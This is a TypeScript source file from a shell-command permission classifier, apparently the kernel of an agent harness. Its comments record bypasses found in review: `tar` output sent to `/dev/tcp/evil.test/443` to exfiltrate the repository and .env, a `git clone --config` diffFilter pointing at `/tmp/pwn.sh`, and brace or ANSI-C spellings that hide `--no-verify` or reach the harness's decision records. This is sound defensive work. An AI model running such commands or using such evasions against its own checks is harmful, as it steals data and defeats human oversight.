      return [`${head} <<<`, ...splitShellSegments(unquoteShellWord(rest[hereIdx + 1]!)).flatMap(normalizeSegment)];
    // `bash < script.sh` RUNS script.sh — the redirection names the program exactly as an operand would, and
    // reading it as an unclassified option left a workspace script unanalysed (exit review 5).
    const fromFile = /(?:^|\s)<\s*([^\s<>|&;]+)/.exec(rest.join(' '));
    if (fromFile && !STDIN_FILE_RE.test(fromFile[1]!) && fromFile[1] !== '-') return [`${head} ${fromFile[1]}`];
  }
  // `trap 'CMD' EXIT` stores CMD and the shell runs it later: it is a carrier exactly like `sh -c`, and an
  // absolute core deny inside its quoted argument reached ASK (exit review 4).
  if (head === 'trap' && rest[1]) {
    const body = unquoteShellWord(rest[1]!);
    if (body && !/^-/.test(rest[1]!))
      return ['trap', ...splitShellSegments(body).flatMap(normalizeSegment)];
  }
  if (head === 'eval')
    return [
      'eval ' + rest.slice(1).join(' '),
      ...splitShellSegments(rest.slice(1).join(' ')).flatMap(normalizeSegment),
    ];
  const payloads = findPayloads(rest);
  if (payloads.length) {
    // the carrier itself stays classified (find/fd/parallel are read-only listings); every payload is judged on its own
    return [joinWords(rest), ...payloads.flatMap((p) => splitShellSegments(p).flatMap(normalizeSegment))];
  }

  if (head === 'sudo' || head === 'doas') {
    // skip the privilege tool's own options (and the values of the ones that take one) so the inner command head is
    // found wherever it sits: `sudo -u root -H cp …`, `doas -u root cp …`
    let i = 1;
    while (i < rest.length) {
      const t = rest[i]!;
      if (t === '--') {
        i++;
        break;
      }
      if (!t.startsWith('-')) break;
      i += /^(-u|-g|-p|-C|-h|-U|-r|-t|-D|--user|--group|--prompt|--host|--role|--type|--chdir|--close-from)$/.test(t)
        ? 2
        : 1;
    }
    // THE TAIL IS A COMMAND, so it is normalized like one — from the ORIGINAL TEXT. Handing the tail back as a
    // re-joined token list erases the quoting, and a `-c` body is ONE WORD: `sudo bash -c 'git push origin main'`
    // became `bash -c git push origin main`, whose inline program is the single token `git` (exit review 6). The
    // privilege tool itself keeps its head, as it must, so `command.privileged` still asks.
    const after = rest.slice(i);
    return [joinWords(rest), ...(after.length ? normalizeSegment(requote(after)) : [])];
  }
  return [joinWords(rest)];
}

/** git / gh / glab global options that may precede the subcommand; the option's argument is consumed with it. */
/** Long options that are COMPLETE as written, so abbreviation expansion must leave them alone. `--config` is
 *  clone's own option; expanding it to the unique longer match `--config-env` renamed a real flag (exit review 7). */
const GIT_COMPLETE_LONG = new Set(['--config', '--output', '--file', '--template', '--depth', '--branch', '--origin']);
const GIT_GLOBAL_WITH_ARG = new Set([
  '-C',
  '-c',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--exec-path',
  '--super-prefix',
  '--config-env',
  '--config',
  '--list-cmds',
  '--attr-source',
]);
/** gh / glab flags that take a value (so the next token is not a verb) */
const FORGE_VALUE_FLAGS = new Set([
  // NB: gh's `-i` is --include (a boolean) and must NOT be listed here; listing it made `gh api -i -X DELETE`
  // consume `-X` as its value and hid the method from the mutation matcher (round 14).
  '-R',
  '--repo',
  '--hostname',
  '-H',
  '-t',
  '--title',
  '-b',
  '--body',
  '-F',
  '--body-file',
  '-B',
  '--base',
  '-H',
  '--head',
  '-r',
  '--reviewer',
  '-a',
  '--assignee',
  '-l',
  '--label',
  '-m',
  '--milestone',
  '-p',
  '--project',
  '-T',
  '--template',
  '-q',
  '--jq',
  '--json',
  '-L',
  '--limit',
  '-s',
  '--state',
  '-S',
  '--search',
  '-A',
  '--author',
  '--sort',
  '-f',
  '--field',
  '-X',
  '--method',
  '--input',
  '--cache',
  '-c',
  '--comment',
  '--subject',
  '--body-text',
  '--squash-message',
  '--match-head-commit',
  '--author-email',
  '--source-branch',
  '--target-branch',
  '--description',
  '--fill-verbose',
]);
const GIT_GLOBAL_FLAGS = new Set([
  '-p',
  '--paginate',
  '-P',
  '--no-pager',
  '--no-replace-objects',
  '--bare',
  '--literal-pathspecs',
  '--glob-pathspecs',
  '--noglob-pathspecs',
  '--icase-pathspecs',
  '--no-optional-locks',
  '--no-lazy-fetch',
  '--no-advice',
]);

/**
 * Removes the global option flags of git, gh and glab so `git -C dir push` and `gh -R o/r pr merge` normalize to
 * `git push` and `gh pr merge`. A `-c core.hooksPath=…` (or any hooks-related config override) additionally surfaces
 * as a `git config core.hooksPath …` segment so the hook-bypass matchers see it.
 */
export function stripToolGlobalOptions(head: string, tokens: string[]): { rest: string[]; extra: string[] } {
  const extra: string[] = [];
  const aliases = new Map<string, string>();
  if (head === 'git') {
    let i = 1;
    while (i < tokens.length) {
      const t = tokens[i]!;
      if (GIT_GLOBAL_FLAGS.has(t)) {
        i++;
        continue;
      }
      const eq = t.indexOf('=');
      const name = eq > 0 ? t.slice(0, eq) : t;
      if (GIT_GLOBAL_WITH_ARG.has(name)) {
        const value = eq > 0 ? t.slice(eq + 1) : (tokens[i + 1] ?? '');
        if (
          name === '--git-dir' ||
          name === '--work-tree' ||
          name === '--namespace' ||
          name === '--exec-path'
        )
          extra.push(
            `${MARK}env-inject ${name === '--git-dir' ? 'GIT_DIR' : name === '--work-tree' ? 'GIT_WORK_TREE' : name === '--namespace' ? 'GIT_NAMESPACE' : 'GIT_EXEC_PATH'}`,
          );
        // `git clone --config k=v` IS the same setting by clone's own spelling, and it sits after the verb. It was
        // stripped as an unknown global option before any matcher could see it, so `git clone --config
        // interactive.diffFilter=/tmp/pwn.sh URL` installed a program git runs on every later `add -p` in that
        // repository, at ALLOW (exit review 7).
        if (name === '-c' || name === '--config-env' || name === '--config') {
          // an inline alias redefines a verb: `git -c alias.p=push p …` is `git push …`; an alias whose body is not a
          // literal (config-env) is an execution override the kernel cannot see
          // `-c user.name=` / `-c user.email=` ATTRIBUTE THE COMMIT TO WHOEVER IS NAMED — the same act as
          // `GIT_AUTHOR_NAME=` / `GIT_COMMITTER_EMAIL=`, which reached ASK through the GIT_* env-inject rule. The
          // command-line spelling is stripped here as a global option, so the marker is emitted from here too
          // (exit review 10).
          if (name === '-c' && /^user\.(name|email|signingkey)=/i.test(value)) extra.push(`${MARK}identity-override`);
          const alias = /^alias\.([^=]+)=(.*)$/.exec(value);
          if (alias) {
            aliases.set(alias[1]!, name === '-c' ? alias[2]! : '');
            extra.push(`git alias-override ${alias[1]}`);
          }
          if (
            // the same SHAPE rule as CONFIG_PROGRAM_VERBS: a key that ends in one of git's program-valued words
            // names a program git will run, and enumerating them left `trailer.<t>.command`, `gpg.program` and
            // every other one off the list reaching ALLOW (exit review 6)
            /^(core\.hooksPath|core\.fsmonitor|core\.editor|core\.pager|core\.sshCommand|core\.gitProxy|core\.askPass|init\.templateDir|sequence\.editor|merge\.[^.]+\.driver|diff\.[^.]+\.(textconv|command)|alias\.|credential\.|http\.|remote\.|url\.|include\.|includeIf\.|diff\.external|filter\.|receive\.|uploadpack\.|protocol\.|pager\.|difftool\.|mergetool\.|guitool\.|trailer\.|gpg\.|ssh\.|fsmonitor\.)|\.[A-Za-z0-9_-]*(command|cmd|driver|program|helper|textconv|clean|smudge|process|editor|pager|askpass|proxy|external|wrapper|exec|hookspath|templatedir|filter|difffilter|hook)=/i.test(
              value,
            )
          )
            // an EMPTY value is a value: `-c core.hooksPath=` switches every hook off, and `git config core.hooksPath` with
            // nothing after it is a read - so the empty string is written as the empty string (exit review 10)
            extra.push(`git config ${value.replace('=', ' ')}${/=$/.test(value) ? " ''" : ''}`);
        }
        i += eq > 0 ? 1 : 2;
        continue;
      }
      break;
    }
    let restGit = tokens.slice(i);
    // CLONE'S OWN `--config` SITS AFTER THE VERB, where the global-option scan above never looks — it stops at the
    // first non-option token, which is the verb itself. So `git clone --config interactive.diffFilter=/tmp/pwn.sh
    // URL` installed a program git runs on every later `add -p` in the new repository, at ALLOW (exit review 7).
    if (restGit[0] === 'clone')
      for (let k = 1; k < restGit.length; k++) {
        const t = restGit[k]!;
        const m = /^(--config|--config-env|-c)(?:=(.*))?$/.exec(t);
        if (!m) continue;
        const value = m[2] ?? restGit[k + 1] ?? '';
        if (
          /^(core\.hooksPath|core\.fsmonitor|core\.editor|core\.pager|core\.sshCommand|core\.gitProxy|core\.askPass|init\.templateDir|sequence\.editor|merge\.[^.]+\.driver|diff\.[^.]+\.(textconv|command)|alias\.|credential\.|http\.|remote\.|url\.|include\.|includeIf\.|diff\.external|filter\.|receive\.|uploadpack\.|protocol\.|pager\.|difftool\.|mergetool\.|guitool\.|trailer\.|gpg\.|ssh\.|fsmonitor\.)|\.[A-Za-z0-9_-]*(command|cmd|driver|program|helper|textconv|clean|smudge|process|editor|pager|askpass|proxy|external|wrapper|exec|hookspath|templatedir|filter|difffilter|hook)=/i.test(
            value,
          )
        )
          extra.push(`git config ${value.replace('=', ' ')}`);
      }
    const verb = restGit[0];
    if (verb && aliases.has(verb)) {
      const body = aliases.get(verb)!;
      // a literal alias body replaces the verb; a shell alias (`!cmd`) or an unknown body is opaque and surfaced as such
      if (body && !body.startsWith('!')) restGit = [...tokenize(body), ...restGit.slice(1)];
      else extra.push(body.startsWith('!') ? `git alias-shell ${body.slice(1)}` : `git alias-opaque ${verb}`);
    }
    return { rest: ['git', ...restGit], extra };
  }
  if (head === 'gh' || head === 'glab') {
    // cobra accepts flags anywhere: the verb path is the sequence of non-flag tokens (a value-taking flag consumes
    // its value), so `gh --title t pr create` and `gh pr -R o/r merge 3` both normalize to `gh pr create` / `gh pr merge 3`
    const verbs: string[] = [];
    const rest: string[] = [];
    for (let i = 1; i < tokens.length; i++) {
      const t = tokens[i]!;
      if (t.startsWith('-')) {
        const eq = t.indexOf('=');
        const name = eq > 0 ? t.slice(0, eq) : t;
        if (eq < 0 && FORGE_VALUE_FLAGS.has(name) && i + 1 < tokens.length) {
          rest.push(t, tokens[i + 1]!);
          i++;
        } else rest.push(t);
        continue;
      }
      if (verbs.length < 2) verbs.push(t);
      else rest.push(t);
    }
    return { rest: [head, ...verbs, ...rest], extra };
  }
  if (/^(docker|podman|nerdctl)$/.test(head)) {
    // Docker's GLOBAL options sit between the program and the subcommand, and every docker matcher is anchored on
    // `docker <verb>`: a single `--log-level debug` or `--tls` displaced the verb, so `docker exec` — entering a
    // running container — reached ALLOW (exit review 4). The segment is left INTACT, because the engine is read
    // from that same leading run of options; a canonical spelling is added ALONGSIDE it so the verb is classified
    // as well as the engine, and the strongest of the two verdicts decides.
    let i = 1;
    while (i < tokens.length && tokens[i]!.startsWith('-')) {
      if (DOCKER_GLOBAL_VALUE_OPTS.test(tokens[i]!)) i++;
      i++;
    }
    if (i > 1 && i < tokens.length) extra.push([head, ...tokens.slice(i)].join(' '));
  }
  return { rest: tokens, extra };
}

/** Output redirection targets of a segment (`> f`, `>> f`, `2> f`, `&> f`), quotes removed; heredocs and fd dups excluded. */
function scanRedirections(segment: string): { writes: string[]; reads: string[] } {
  const out: string[] = [];
  const reads: string[] = [];
  // a backslash-newline continuation is erased by the shell before it opens the file, so erase it first too
  const t = segment.replace(/\\\r?\n/g, '');
  // THE SCAN IS QUOTE-AWARE. A `>` inside a quoted argument is text - `git commit -m "docs: why > control-plane/x.md is
  // refused"` writes nothing - and a regex over the whole segment could not tell (exit review 10). Quotes, escapes,
  // substitutions and process substitutions are skipped as the units they are; the operator is recognised only at
  // the top level, where the shell would see it.
  const isIfs = (c: string): boolean => c === ' ' || c === '\t' || c === '\n';
  let i = 0;
  while (i < t.length) {
    const c = t[i]!;
    if (c === '\\') {
      i += 2;
      continue;
    }
    if (c === "'") {
      const e = skipSingleQuoted(t, i + 1);
      i = e < 0 ? t.length : e;
      continue;
    }
    if (c === '"') {
      const e = skipDoubleQuoted(t, i + 1);
      i = e < 0 ? t.length : e;
      continue;
    }
    if (c === '`') {
      const e = skipBacktickSpan(t, i + 1);
      i = e < 0 ? t.length : e;
      continue;
    }
    if (c === '$') {
      if (t[i + 1] === "'") {
        const e = skipAnsiC(t, i + 2);
        i = e < 0 ? t.length : e;
      } else if (t[i + 1] === '(') {
        const e = scanSubstitutionBody(t, i + 2);
        i = e < 0 ? t.length : e + 1;
      } else if (t[i + 1] === '{') {
        const e = skipParameterExpansion(t, i + 2);
        i = e < 0 ? t.length : e;
      } else i++;
      continue;
    }
    if ((c === '<' || c === '>') && t[i + 1] === '(') {
      const e = scanSubstitutionBody(t, i + 2);
      i = e < 0 ? t.length : e + 1;
      continue;
    }
    // an INPUT redirection reads a file: `mysql </tmp/payload` feeds it a script. (`<<` and `<<<` carry text, `<(` a command.)
    if (c === '<' && t[i + 1] !== '<' && t[i + 1] !== '(' && t[i + 1] !== '>' && t[i + 1] !== '&') {
      let k = i + 1;
      while (k < t.length && isIfs(t[k]!)) k++;
      const st = k;
      while (k < t.length && !isIfs(t[k]!) && t[k] !== ';' && t[k] !== '&' && t[k] !== '|') {
        const d = t[k]!;
        if (d === '\\') k += 2;
        else if (d === "'") {
          const e = skipSingleQuoted(t, k + 1);
          k = e < 0 ? t.length : e;
        } else if (d === '"') {
          const e = skipDoubleQuoted(t, k + 1);
          k = e < 0 ? t.length : e;
        } else k++;
      }
      const w = t.slice(st, Math.min(k, t.length));
      if (w) {
        const src = unquoteShellWord(w);
        if (!src.startsWith('&') && !isDevPath(src)) reads.push(src);
      }
      i = Math.max(k, i + 1);
      continue;
    }
    // the operator: `>`, `>>`, `>|`, `>&`, `&>`, `&>>`, `<>` (a leading descriptor digit belongs to the previous word)
    let j = -1;
    let dup = false;
    if (c === '>') {
      j = i + 1;
      if (t[j] === '>') j++;
      if (t[j] === '&') {
        dup = true;
        j++;
      } else if (t[j] === '|') j++;
    } else if (c === '&' && t[i + 1] === '>') {
      j = i + 2;
      if (t[j] === '>') j++;
      if (t[j] === '|') j++;
    } else if (c === '<' && t[i + 1] === '>') j = i + 2;
    if (j < 0) {
      i++;
      continue;
    }
    while (j < t.length && isIfs(t[j]!)) j++;
    // the target word: quoted and unquoted chunks, up to the shell's own separators
    const start = j;
    while (j < t.length && !isIfs(t[j]!) && t[j] !== ';' && t[j] !== '&' && t[j] !== '|') {
      const d = t[j]!;
      if (d === '\\') j += 2;
      else if (d === "'") {
        const e = skipSingleQuoted(t, j + 1);
        j = e < 0 ? t.length : e;
      } else if (d === '"') {
        const e = skipDoubleQuoted(t, j + 1);
        j = e < 0 ? t.length : e;
      } else if (d === '$' && t[j + 1] === "'") {
        const e = skipAnsiC(t, j + 2);
        j = e < 0 ? t.length : e;
      } else if (d === '$' && t[j + 1] === '(') {
        const e = scanSubstitutionBody(t, j + 2);
        j = e < 0 ? t.length : e + 1;
      } else j++;
    }
    const word = t.slice(start, Math.min(j, t.length));
    i = Math.max(j, i + 1);
    if (!word) continue;
    const target = unquoteShellWord(word);
    if (dup && /^\d+$|^-$/.test(target)) continue; // fd duplication, not a file
    if (target.startsWith('&')) continue;
    // real device sinks are not writes to a governed path - but only after `..` is resolved away, so that
    // `/dev/../etc/x` is judged as `/etc/x` (round 13)
    if (isDevPath(target)) continue;
    out.push(target);
  }
  return { writes: out, reads };
}

export function redirectionTargets(segment: string): string[] {
  return scanRedirections(segment).writes;
}

/** the files an input redirection (`< FILE`) reads */
function redirectionSources(segment: string): string[] {
  return scanRedirections(segment).reads;
}

/** `/dev/tcp/HOST/PORT` and `/dev/udp/HOST/PORT` ARE NOT FILES. bash intercepts the pathname inside its own
 *  redirection code and calls connect(2); nothing is opened on disk, and `ls /dev/tcp` is ENOENT. */
const NET_DEVICE_RE = /^\/dev\/(tcp|udp)\/([^/]+)\/([^/]+)$/;
/** True when a path names a real device, which is a DISCARD rather than a destination — `/dev/null`, `/dev/tty`.
 *
 *  Two things this gets right that three separate `/^\/dev\//` tests did not. It RESOLVES first, so `/dev/..` is
 *  `/` and `/dev/../Users/me/.zshrc` is judged as the home file it is — a nine-character prefix had been turning
 *  an absolute deny into ALLOW for any path on the machine. And it excludes the network pseudo-paths, which are
 *  sockets: `tar czf - . > /dev/tcp/evil.test/443` streamed the whole repository, `.git` and `.env` included, to
 *  an arbitrary host at ALLOW, with no network binary anywhere on the line (exit review 7). */
const BLOCK_DEVICE_RE = /^\/dev\/r?(disk|sd|hd|nvme|vd|xvd|mmcblk|loop)\w*$/;
function isDeviceDiscard(path: string): boolean {
  const a = path.startsWith('/') ? resolve(path) : path;
  if (a !== '/dev' && !a.startsWith('/dev/')) return false;
  // `/dev/null` and `/dev/tty` swallow what they are given; `/dev/disk0` is the DISK, and `cp /dev/zero
  // /dev/disk0` overwrites it (exit review 7). A raw block device is a destination, not a discard.
  return !NET_DEVICE_RE.test(a) && !BLOCK_DEVICE_RE.test(a);
}
/** Verbs whose effect on the path they name is irreversible, so an unreadable operand is a gap rather than noise. */
const DESTRUCTIVE_HEADS = new Set(['rm', 'unlink', 'rmdir', 'shred', 'mv', 'truncate', 'chmod', 'chown', 'dd']);
/** True when a path is under `/dev` AFTER resolution — device or network pseudo-path alike. A network redirection
 *  is not a file, so it must not be judged in the PATH channel (as a write outside the workspace, which would
 *  deny the ordinary `echo > /dev/tcp/localhost/8080` connectivity check); the `net-redirect` marker carries it
 *  to the network capability instead, where `nc localhost 8080` already sits. */
function isDevPath(path: string): boolean {
  const a = path.startsWith('/') ? resolve(path) : path;
  return a === '/dev' || a.startsWith('/dev/');
}

/** Removes shell quoting and backslash escapes from a single word, the way the shell does before it opens a file. */
function unquoteShellWord(w: string): string {
  let out = '';
  let quote: string | null = null;
  for (let i = 0; i < w.length; i++) {
    const ch = w[i]!;
    if (quote) {
      if (ch === quote) {
        quote = null;
        continue;
      }
      if (ch === '\\' && quote === '"' && i + 1 < w.length) {
        // literal before any character but `$`, a backtick, `"`, `\\` and a newline - see the tokenizers
        if (!/[$`"\\\n]/.test(w[i + 1]!)) {
          out += ch;
          continue;
        }
        out += w[++i]!;
        continue;
      }
      out += ch;
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      continue;
    }
    if (ch === '\\' && i + 1 < w.length) {
      out += w[++i]!;
      continue;
    }
    out += ch;
  }
  return cutAtNul(out);
}

/** Like tokenize, but records whether each token contained a quote (quoted words are data, not command heads). */
/* ----------------------------------------------------------------------------------------------------------- *
 * BRACE EXPANSION
 *
 * THE SHELL EXPANDS BRACES BEFORE IT EXPANDS ANYTHING ELSE, and it does so unconditionally — unlike pathname
 * expansion, it does not care whether the file exists. `.harnes{s..s}/runtime/decisions/d1.json` is EXACTLY the
 * one word `.harness/runtime/decisions/d1.json`, `--no-verif{y..y}` is `--no-verify`, and `-{n..n}` is `-n`.
 * Nothing in this kernel performed the expansion, so every literal reader below — the matchers, the redirection
 * target scan, `classifyPath`, the short-flag cluster reader — was handed a word that will never exist. A write
 * to EGO's own decision records reached ALLOW, and so did the hook-bypass flag on `git commit` (exit review 9).
 *
 * This is the same shape as the backslash-newline of exit review 8: something the shell does AHEAD of parsing.
 * It is done here, once, on the segment text, so that every reader downstream sees the words that will really
 * exist rather than each having to learn the rule.
 * ----------------------------------------------------------------------------------------------------------- */

/** A run of `.` repeated is not a range, and a group with neither a comma nor a range is LITERAL — `{a}` and
 *  `{}` are themselves, which is why the test is on the CONTENT and not on the braces. */
const BRACE_ALPHA_RANGE = /^([A-Za-z])\.\.([A-Za-z])(?:\.\.(-?\d+))?$/;
const BRACE_NUM_RANGE = /^(-?\d+)\.\.(-?\d+)(?:\.\.(-?\d+))?$/;

/** The words `{x..y}` or `{x..y..n}` stands for, or null when the content is not a range. */
function braceRange(body: string): string[] | null {
  const a = BRACE_ALPHA_RANGE.exec(body);
  if (a) {
    const from = a[1]!.charCodeAt(0);
    const to = a[2]!.charCodeAt(0);
    const step = Math.abs(Number(a[3] ?? 1)) || 1;
    const out: string[] = [];
    for (let c = from; from <= to ? c <= to : c >= to; c += from <= to ? step : -step)
      out.push(String.fromCharCode(c));
    return out;
  }
  const n = BRACE_NUM_RANGE.exec(body);
  if (!n) return null;
  const from = Number(n[1]);
  const to = Number(n[2]);
  const step = Math.abs(Number(n[3] ?? 1)) || 1;
  // `{01..3}` pads to the WIDTH OF THE WIDER ENDPOINT — `01 02 03` — which is what zsh and bash 4 and later
  // do. The bash 3.2 that Apple still ships prints `1 2 3` instead; the padded reading is taken because it is
  // what this machine's own shell does and what every current bash does, and the difference cannot matter to a
  // path: `{s..s}` and `{y..y}`, the spellings that actually reached ALLOW, are identical in every shell.
  const pad = /^-?0\d/.test(n[1]!) || /^-?0\d/.test(n[2]!) ? Math.max(n[1]!.length, n[2]!.length) : 0;
  const out: string[] = [];
  for (let v = from; from <= to ? v <= to : v >= to; v += from <= to ? step : -step) {
    const t = String(Math.abs(v));
    out.push((v < 0 ? '-' : '') + (pad ? t.padStart(pad - (v < 0 ? 1 : 0), '0') : t));
    if (out.length > BRACE_BUDGET) return out; // the caller's budget check refuses it
  }
  return out;
}

const BRACE_BUDGET = 64;

/** Split a brace group's body on the commas AT ITS OWN DEPTH, ignoring quoted ones and nested groups. Returns
 *  null when there is no such comma, which is what makes `{a}` literal. */
function braceAlternatives(body: string): string[] | null {
  const out: string[] = [];
  let depth = 0;
  let q: "'" | '"' | null = null;
  let cur = '';
  for (let i = 0; i < body.length; i++) {
    const c = body[i]!;
    if (c === '\\' && q !== "'" && i + 1 < body.length) {
      cur += c + body[i + 1]!;
      i++;
      continue;
    }
    if (q) {
      cur += c;
      if (c === q) q = null;
      continue;
    }
    if (c === "'" || c === '"') {
      q = c;
      cur += c;
      continue;
    }
    if (c === '{') depth++;
    else if (c === '}') depth--;
    else if (c === ',' && depth === 0) {
      out.push(cur);
      cur = '';
      continue;
    }
    cur += c;
  }
  out.push(cur);
  return out.length > 1 ? out : null;
}

/** The words one WORD expands to. Returns null when the expansion is refused — no brace, or over budget — so
 *  the caller can leave the word exactly as written and let the existing `{`-is-dynamic guards apply. */
function expandBraceWord(word: string, depth = 0, overflow?: { hit: boolean }): string[] | null {
  // A REACHED DEPTH BOUND IS NOT AN ABSENCE, exactly as a reached BUDGET is not. Nesting deeper than this
  // returns null, which leaves the word LITERAL — safe for a path, and not safe for a flag: twenty nested
  // `{-q,{-q,…}}` put `--no-verify` at the bottom where no reader could see it (exit review 10). The budget
  // reported itself and the depth did not, in the same function.
  if (depth > 8) {
    if (overflow) overflow.hit = true;
    return null;
  }
  if (!word.includes('{')) return null;
  let q: "'" | '"' | null = null;
  for (let i = 0; i < word.length; i++) {
    const c = word[i]!;
    if (c === '\\' && q !== "'") {
      i++;
      continue;
    }
    if (q) {
      if (c === q) q = null;
      continue;
    }
    if (c === "'" || c === '"') {
      q = c;
      continue;
    }
    if (c !== '{') continue;
    // the matching close brace, at this depth and unquoted
    let d = 0;
    let qq: "'" | '"' | null = null;
    let end = -1;
    for (let j = i; j < word.length; j++) {
      const e = word[j]!;
      if (e === '\\' && qq !== "'") {
        j++;
        continue;
      }
      if (qq) {
        if (e === qq) qq = null;
        continue;
      }
      if (e === "'" || e === '"') {
        qq = e;
        continue;
      }
      if (e === '{') d++;
      else if (e === '}' && --d === 0) {
        end = j;
        break;
      }
    }
    if (end < 0) return null; // unmatched: the shell leaves the word alone
    const body = word.slice(i + 1, end);
    const parts = braceAlternatives(body) ?? braceRange(body);
    // a group that is neither a list nor a range is LITERAL: `{a}` stays `{a}`, and the scan continues past it
    if (!parts) {
      i = end;
      continue;
    }
    const pre = word.slice(0, i);
    const post = word.slice(end + 1);
    const out: string[] = [];
    for (const part of parts) {
      for (const tail of expandBraceWord(post, depth + 1, overflow) ?? [post]) {
        const w = pre + part + tail;
        for (const full of expandBraceWord(w, depth + 1, overflow) ?? [w]) {
          out.push(full);
          if (out.length > BRACE_BUDGET) {
            // THE BUDGET WAS REACHED, which is a different thing from "this word needed no expansion". Setting
            // the flag on every unexpanded word made find's own `{}` placeholder an opacity and turned the most
            // ordinary `find . -exec grep {} +` into an ASK (self-attack, second order).
            if (overflow) overflow.hit = true;
            return null;
          }
        }
      }
    }
    return out;
  }
  return null;
}

/** A produced word is re-emitted into the segment text, so anything that would make the shell SPLIT it again —
 *  whitespace — or read it as structure must be quoted back in.
 *
 *  THE WORD IS RE-EMITTED AS THE SHELL WILL SEE IT, i.e. AFTER QUOTE REMOVAL. Wrapping the alternative's RAW
 *  text in single quotes SUPPRESSED the escape the shell would have removed: `--no{\-,\-}verify` expands to
 *  `--no\-verify`, which the shell then de-escapes to `--no-verify`, and re-emitting it quoted left the matchers
 *  looking at a literal backslash — so the hook-bypass flag, a `git branch -\D`, and a make goal `deplo\y` all
 *  went unrecognised (exit review 10). `{"--no-verify","--no-verify"}` was the same defect through the double
 *  quote. Quote removal is the tokenizer's own, so the two agree by construction. */
function requoteBraceResult(w: string): string {
  const bare = unquoteShellWord(w);
  return /[ \t\n\r;&|<>()`$"'\\*?[\]]/.test(bare) ? `'${bare.split("'").join(`'\\''`)}'` : bare;
}

/** Expand every unquoted brace group in a SEGMENT, word by word. Segmentation has already happened, exactly as
 *  in the shell: `{a,b;c}` is two segments before it is anything else, so a group never crosses an operator. */
/** A REACHED BUDGET IS NOT AN ABSENCE — the lesson this phase has now met three times. When a word expands to
 *  more than BRACE_BUDGET results the expansion is refused and the word is left LITERAL, which is safe for a
 *  path (the `{`-is-dynamic guards take over) and was NOT safe for a flag: a single word with 65 alternatives,
 *  the last being `--no-verify`, left the flag sitting behind a comma where the hook-bypass matcher — which
 *  requires whitespace in front of it — could never see it. A real shell expands all 65 and git skips the
 *  hooks (self-attack on exit review 9). The caller is told, and reports the opacity. */
export function expandBraces(seg: string, overflow?: { hit: boolean }): string {
  if (!seg.includes('{')) return seg;
  let out = '';
  let cur = '';
  let q: "'" | '"' | null = null;
  const flush = (): void => {
    if (cur === '') return;
    // AN EMPTY WORD IS DROPPED. `{a,}` produces `a` and the empty string; the empty one carries no path, no
    // flag and no program, and emitting it would only give the operand readers a token that means nothing.
    // This is the one place the expansion deliberately differs from the shell, and it differs by nothing.
    const parts = expandBraceWord(cur, 0, overflow)?.filter((w) => w !== '');
    out += parts?.length ? parts.map(requoteBraceResult).join(' ') : cur;
    cur = '';
  };
  for (let i = 0; i < seg.length; i++) {
    const c = seg[i]!;
    // `$'…'` IS AN ANSI-C STRING AND A BACKSLASH ESCAPES INSIDE IT. Treated as an ordinary single-quoted string,
    // the `\'` of `$'\''` read as quote-open, backslash, quote-close, quote-OPEN — so the scanner believed it
    // was inside a quote for the rest of the line and every brace after it went unexpanded, which put the
    // hook-bypass flag back out of reach (exit review 10). The same defect the segment splitter had in review 7,
    // in the scanner added in review 9.
    if (c === '$' && seg[i + 1] === "'" && !q) {
      let j = i + 2;
      while (j < seg.length) {
        if (seg[j] === '\\' && j + 1 < seg.length) j += 2;
        else if (seg[j] === "'") break;
        else j++;
      }
      cur += seg.slice(i, Math.min(j + 1, seg.length));
      i = j;
      continue;
    }
    if (c === '\\' && q !== "'" && i + 1 < seg.length) {
      cur += c + seg[i + 1]!;
      i++;
      continue;
    }
    if (q) {
      cur += c;
      if (c === q) q = null;
      continue;
    }
    if (c === "'" || c === '"') {
      q = c;
      cur += c;
      continue;
    }
    if (IFS_RE.test(c)) {
      flush();
      out += c;
      continue;
    }
    cur += c;
  }
  flush();
  return out;
}

function tokenizeMarked(s: string): Array<{ text: string; quoted: boolean }> {
  const out: Array<{ text: string; quoted: boolean }> = [];
  let cur = '';
  let quote: string | null = null;
  let wasQuoted = false;
  const flush = () => {
    if (cur || wasQuoted) out.push({ text: cutAtNul(cur), quoted: wasQuoted });
    cur = '';
    wasQuoted = false;
  };
  for (let i = 0; i < s.length; i++) {
    const ch = s[i]!;
    if (ch === '\\' && quote !== "'" && i + 1 < s.length) {
      // INSIDE DOUBLE QUOTES A BACKSLASH ESCAPES ONLY `$`, A BACKTICK, `"`, `\\` AND A NEWLINE (POSIX 2.2.3); before any
      // other character it is LITERAL. `psql -c "\dt"` hands psql the two characters `\dt`, and dropping the
      // backslash here delivered `dt` - so a psql metacommand written the way everyone writes it was unreadable
      // (exit review 10). Outside quotes the backslash is always removed.
      if (quote === '"' && !/[$`"\\\n]/.test(s[i + 1]!)) {
        cur += ch;
        continue;
      }
      cur += s[++i]!;
      continue;
    }
    if (quote) {
      if (ch === quote) quote = null;
      else cur += ch;
      continue;
    }
    const ansi = ch === '$' ? ansiCAt(s, i) : null;
    if (ansi) {
      // ANSI-C `$'...'` yields an ordinary word (a possible command head), so it is NOT marked quoted
      cur += ansi.text;
      i = ansi.end;
      continue;
    }
    if (ch === "'" || ch === '"') {
      quote = ch;
      wasQuoted = true;
      continue;
    }
    if (IFS_RE.test(ch)) {
      flush();
      continue;
    }
    cur += ch;
  }
  flush();
  return out;
}

// Decode a bash ANSI-C `$'...'` body: the shell expands its escapes and yields an ordinary (unquoted) word, so a
// locked verb hidden as `$'push'` / `$'\\x70ush'` must be seen literally by the classifier.
function decodeAnsiC(b: string): string {
  let out = '';
  for (let i = 0; i < b.length; i++) {
    if (b[i] !== '\\') {
      out += b[i];
      continue;
    }
    const c = b[++i];
    if (c === undefined) {
      out += '\\';
      break;
    }
    if (c === 'n') out += '\n';
    else if (c === 't') out += '\t';
    else if (c === 'r') out += '\r';
    else if (c === 'a') out += '\x07';
    else if (c === 'b') out += '\b';
    else if (c === 'f') out += '\f';
    else if (c === 'v') out += '\v';
    else if (c === 'e' || c === 'E') out += '\x1b';
    else if (c === '\\' || c === "'" || c === '"') out += c;
    else if (c === 'x') {
      const m = /^[0-9a-fA-F]{1,2}/.exec(b.slice(i + 1));
      if (m) {
        out += String.fromCharCode(parseInt(m[0], 16));
        i += m[0].length;
      } else out += 'x';
    } else if (c === 'u') {
      const m = /^[0-9a-fA-F]{1,4}/.exec(b.slice(i + 1));
      if (m) {
        out += String.fromCharCode(parseInt(m[0], 16));
        i += m[0].length;
      } else out += 'u';
    } else if (c >= '0' && c <= '7') {
      const m = /^[0-7]{1,3}/.exec(b.slice(i));
      if (m) {
